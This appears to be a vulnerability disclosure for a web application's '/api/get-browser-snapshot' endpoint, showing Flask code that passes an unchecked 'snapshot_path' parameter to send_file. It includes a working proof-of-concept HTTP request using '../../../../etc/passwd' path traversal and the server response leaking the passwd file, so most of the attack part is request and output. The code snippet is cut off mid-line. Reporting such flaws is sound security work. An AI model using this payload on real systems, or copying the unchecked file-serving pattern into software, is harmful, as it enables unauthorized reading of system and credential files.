### Version
latest(2024.6.26)
### Description
At the `/api/get-browser-snapshot` endpoint, the snapshot_path value is not checked, resulting in path traversal which allow attackers to get any file of the system. 
### Source code
```python
@app.route("/api/get-browser-snapshot", methods=["GET"])
@route_logger(logger)
def browser_snapshot():
    snapshot_path = request.args.get("snapshot_path")
    return send_file(snapshot_path, as_attachment=Tru
```
### PoC
```
GET /api/get-browser-snapshot?snapshot_path=../../../../etc/passwd HTTP/1.1
Host: 10.160.167.54:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: zbx_session=cookie
Upgrade-Insecure-Requests: 1
Priority: u=1
```
response:
```
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=passwd
Content-Type: application/octet-stream
Content-Length: 2505
Last-Modified: Tue, 11 Jun 2024 01:56:47 GMT
Cache-Control: no-cache
ETag: "1718071007.1050704-2505-555683153"
Date: Wed, 26 Jun 2024 08:40:23 GMT
Access-Control-Allow-Origin: http://localhost:3000
Vary: Origin

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
